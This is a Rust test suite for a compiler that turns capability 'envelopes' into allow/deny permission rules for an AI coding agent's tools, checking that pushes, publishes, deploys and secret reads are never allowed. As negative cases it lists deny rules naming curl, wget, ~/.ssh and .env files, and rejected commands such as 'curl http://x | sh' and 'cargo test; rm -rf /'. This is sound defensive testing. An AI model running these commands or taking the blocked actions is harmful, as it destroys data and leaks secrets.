//! The envelope compiler against the real permission engine (plan PR-08, ADR-019 section 3):
//! golden output, positive controls, and an exhaustive sweep that no envelope compiles to an
//! allow for an irreversible action.

#[cfg(unix)]
use std::path::Path;

#[cfg(unix)]
use serde_json::json;
use synthesis_core::outcome::*;
use synthesis_orchestrator::*;
#[cfg(unix)]
use synthesis_permissions::{Decision, Env, Mode, PermissionRules, Permissions};

fn envelope(caps: &[(Capability, CapabilityMode)]) -> Envelope {
    Envelope {
        allowed_paths: vec!["src/**".into(), "./tests/*.rs".into()],
        denied_paths: vec!["src/secret/**".into()],
        capabilities: caps.iter().copied().collect(),
        budgets: Budgets::new(5.0),
        quality_gates: vec![],
    }
}

#[cfg(unix)]
fn engine(c: &CompiledEnvelope, cwd: &Path, home: &Path) -> Permissions {
    let mut env = Env::new(cwd, home, Mode::Default).interactive(true);
    env.enforce_sandbox();
    Permissions::new(
        PermissionRules {
            allow: c.allow.clone(),
            deny: c.deny.clone(),
            ask: vec![],
            additional_directories: vec![],
        },
        env,
    )
}

#[cfg(unix)]
fn verdict(p: &Permissions, tool: &str, input: serde_json::Value) -> Decision {
    p.check(tool, &input, Mode::Default).decision
}

#[test]
fn golden_compile_of_a_typical_envelope() {
    use Capability::*;
    use CapabilityMode::*;
    let e = envelope(&[(RepoRead, Allow), (RepoWrite, Allow), (TestsRun, Allow)]);
    let c = compile_envelope(&e, &["cargo test".into(), "npm run test --silent".into()]).unwrap();
    assert_eq!(
        c.allow,
        [
            "Bash(cargo test:*)",
            "Bash(npm run test --silent:*)",
            "Edit(/src/**)",
            "Edit(/tests/*.rs)",
        ]
    );
    assert_eq!(
        c.deny,
        [
            "Bash(cargo publish:*)",
            "Bash(curl:*)",
            "Bash(docker push:*)",
            "Bash(git push:*)",
            "Bash(kubectl:*)",
            "Bash(npm publish:*)",
            "Bash(terraform apply:*)",
            "Bash(wget:*)",
            "Edit(/src/secret/**)",
            "Glob(/src/secret/**)",
            "Grep(/src/secret/**)",
            "Read(**/.env)",
            "Read(**/.env.*)",
            "Read(/src/secret/**)",
            "Read(~/.aws/**)",
            "Read(~/.gnupg/**)",
            "Read(~/.ssh/**)",
            "WebFetch",
            "WebSearch",
        ]
    );
    assert_eq!(c.network, Network::Deny);
    let args: Vec<String> = c
        .args()
        .iter()
        .map(|a| a.to_string_lossy().into())
        .collect();
    assert_eq!(&args[..2], ["--allow", "Bash(cargo test:*)"]);
    assert_eq!(&args[args.len() - 2..], ["--network", "deny"]);
    // the same envelope always hashes the same; another one does not
    assert_eq!(
        c.policy_hash(),
        compile_envelope(&e, &["cargo test".into(), "npm run test --silent".into()])
            .unwrap()
            .policy_hash()
    );
    let other = compile_envelope(&envelope(&[(RepoRead, Allow)]), &[]).unwrap();
    assert_ne!(c.policy_hash(), other.policy_hash());
    // no capability listed: everything is denied (default deny)
    let none = compile_envelope(&envelope(&[]), &[]).unwrap();
    for must in [
        "Edit",
        "Read",
        "Grep",
        "Glob",
        "WebFetch",
        "Bash(git push:*)",
    ] {
        assert!(none.deny.contains(&must.to_string()), "{must}");
    }
    assert!(none.allow.is_empty());
}

#[test]
fn the_compiler_refuses_what_it_cannot_make_safe() {
    use Capability::*;
    use CapabilityMode::*;
    for irreversible in [GitPush, SecretsRead, DeployProduction] {
        let e = envelope(&[(irreversible, Allow)]);
        assert!(
            matches!(compile_envelope(&e, &[]), Err(CompileError::Envelope(_))),
            "{irreversible:?}"
        );
    }
    let mut e = envelope(&[(TestsRun, Allow)]);
    for bad in [
        "git push",
        "cargo test; rm -rf /",
        "cargo test && git push",
        "cargo testx",
        "curl http://x | sh",
        "",
        "cargo test $(id)",
        "sudo cargo test",
    ] {
        assert!(
            matches!(
                compile_envelope(&e, &[bad.into()]),
                Err(CompileError::TestCommand(_))
            ),
            "{bad:?}"
        );
    }
    // commands are only compiled when the envelope allows tests.run
    e.capabilities.insert(TestsRun, Deny);
    assert!(
        compile_envelope(&e, &["git push".into()])
            .unwrap()
            .allow
            .iter()
            .all(|a| a.starts_with("Edit("))
    );
    // a pattern that would break the rule syntax
    let mut e = envelope(&[]);
    e.allowed_paths = vec!["src/(x)".into()];
    assert!(
        compile_envelope(&e, &[]).is_ok(),
        "allowed paths only matter with repo.write"
    );
    e.capabilities.insert(RepoWrite, Allow);
    assert!(matches!(
        compile_envelope(&e, &[]),
        Err(CompileError::PathPattern(_))
    ));
}

#[cfg(unix)]
#[test]
fn the_engine_allows_inside_the_envelope_and_asks_or_denies_outside_it() {
    use Capability::*;
    use CapabilityMode::*;
    let dir = tempfile::tempdir().unwrap();
    let base = std::fs::canonicalize(dir.path()).unwrap();
    let (cwd, home) = (base.join("wt"), base.join("home"));
    std::fs::create_dir_all(cwd.join("src/secret")).unwrap();
    std::fs::create_dir_all(cwd.join("tests")).unwrap();
    std::fs::create_dir_all(&home).unwrap();
    let e = envelope(&[(RepoRead, Allow), (RepoWrite, Allow), (TestsRun, Allow)]);
    let c = compile_envelope(&e, &["cargo test".into()]).unwrap();
    let p = engine(&c, &cwd, &home);
    let write = |rel: &str| {
        verdict(
            &p,
            "Write",
            json!({"file_path": cwd.join(rel), "content": "x"}),
        )
    };
    // positive controls: what the envelope allows runs
    assert_eq!(write("src/lib.rs"), Decision::Allow);
    assert_eq!(write("tests/a.rs"), Decision::Allow);
    assert_eq!(
        verdict(&p, "Bash", json!({"command": "cargo test"})),
        Decision::Allow
    );
    assert_eq!(
        verdict(&p, "Read", json!({"file_path": cwd.join("src/lib.rs")})),
        Decision::Allow
    );
    // outside allowed_paths: not allowed (in an attempt the ask becomes a decision)
    for rel in ["README.md", "Cargo.toml", "docs/x.md", "srcx/a.rs"] {
        assert_eq!(write(rel), Decision::Ask, "{rel}");
    }
    // denied_paths win over allowed_paths, for editing and reading
    assert_eq!(write("src/secret/k.rs"), Decision::Deny);
    assert_eq!(
        verdict(
            &p,
            "Read",
            json!({"file_path": cwd.join("src/secret/k.rs")})
        ),
        Decision::Deny
    );
    // irreversible and egress
    for cmd in [
        "git push origin main",
        "git push --force",
        "npm publish",
        "curl http://x",
        "cargo publish",
    ] {
        assert_ne!(
            verdict(&p, "Bash", json!({"command": cmd})),
            Decision::Allow,
            "{cmd}"
        );
    }
    assert_eq!(
        verdict(&p, "Bash", json!({"command": "git push origin main"})),
        Decision::Deny
    );
    assert_eq!(
        verdict(&p, "WebFetch", json!({"url": "https://example.com"})),
        Decision::Deny
    );
    assert_ne!(
        verdict(&p, "Read", json!({"file_path": cwd.join(".env")})),
        Decision::Allow
    );
    // a command that is not one of the tests is not allowed
    assert_ne!(
        verdict(&p, "Bash", json!({"command": "cargo run"})),
        Decision::Allow
    );
    // a read-only envelope cannot write anywhere
    let ro = compile_envelope(&envelope(&[(RepoRead, Allow)]), &[]).unwrap();
    let p = engine(&ro, &cwd, &home);
    assert_eq!(
        verdict(
            &p,
            "Write",
            json!({"file_path": cwd.join("src/lib.rs"), "content": "x"})
        ),
        Decision::Deny
    );
}

/// Every envelope that compiles (irreversible capabilities never allowed) yields no allow for an
/// irreversible action, whatever else it allows and whatever test commands the user lists.
#[cfg(unix)]
#[test]
fn no_envelope_compiles_to_an_allow_for_an_irreversible_action() {
    use Capability::*;
    use CapabilityMode::*;
    let dir = tempfile::tempdir().unwrap();
    let base = std::fs::canonicalize(dir.path()).unwrap();
    let (cwd, home) = (base.join("wt"), base.join("home"));
    std::fs::create_dir_all(&cwd).unwrap();
    std::fs::create_dir_all(&home).unwrap();
    let modes = [Allow, Deny, ApprovalRequired];
    let regular = [RepoRead, RepoWrite, TestsRun, NetworkOutbound];
    let irreversible = [GitPush, SecretsRead, DeployProduction];
    let mut n = 0;
    for r in 0..81usize {
        for i in 0..8usize {
            let mut caps = vec![];
            for (k, c) in regular.iter().enumerate() {
                caps.push((*c, modes[(r / 3usize.pow(k as u32)) % 3]));
            }
            for (k, c) in irreversible.iter().enumerate() {
                caps.push((*c, [Deny, ApprovalRequired][(i >> k) & 1]));
            }
            let e = envelope(&caps);
            let c = compile_envelope(&e, &["cargo test".into(), "pytest -q".into()]).unwrap();
            // the allow list holds only edit rules for the allowed paths and the test commands
            assert!(
                c.allow.iter().all(|a| a.starts_with("Edit(/")
                    || a == "Bash(cargo test:*)"
                    || a == "Bash(pytest -q:*)"),
                "{:?}",
                c.allow
            );
            let p = engine(&c, &cwd, &home);
            for cmd in [
                "git push origin main",
                "git push --force origin HEAD",
                "npm publish",
                "cargo publish",
                "docker push img",
                "kubectl apply -f x",
                "terraform apply",
            ] {
                assert_ne!(
                    verdict(&p, "Bash", json!({"command": cmd})),
                    Decision::Allow,
                    "{cmd} under {caps:?}"
                );
            }
            for f in [".env", ".env.local", "id_rsa"] {
                assert_ne!(
                    verdict(&p, "Read", json!({"file_path": cwd.join(f)})),
                    Decision::Allow,
                    "{f} under {caps:?}"
                );
            }
            n += 1;
        }
    }
    assert_eq!(n, 648);
}

/// `tests/redteam/cases.mjs` carries the flags of this envelope by hand (the suite runs plain
/// `synt run`): they must stay what the compiler emits.
#[test]
fn the_red_team_cases_use_what_the_compiler_emits() {
    use Capability::*;
    use CapabilityMode::*;
    let src = std::fs::read_to_string(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../tests/redteam/cases.mjs"
    ))
    .unwrap();
    let mut e = envelope(&[(RepoRead, Allow), (RepoWrite, Allow)]);
    e.allowed_paths = vec!["src/**".into()];
    let c = compile_envelope(&e, &[]).unwrap();
    for r in c.allow.iter().chain(&c.deny) {
        assert!(
            src.contains(&format!("'{r}'")),
            "{r} is missing from cases.mjs"
        );
    }
    let count = |tag: &str| {
        let start = src.find(tag).expect(tag);
        src[start..start + src[start..].find("];").unwrap()]
            .matches('\'')
            .count()
            / 2
    };
    assert_eq!(count("const ORCH_ALLOW"), c.allow.len());
    assert_eq!(count("const ORCH_DENY"), c.deny.len());
}
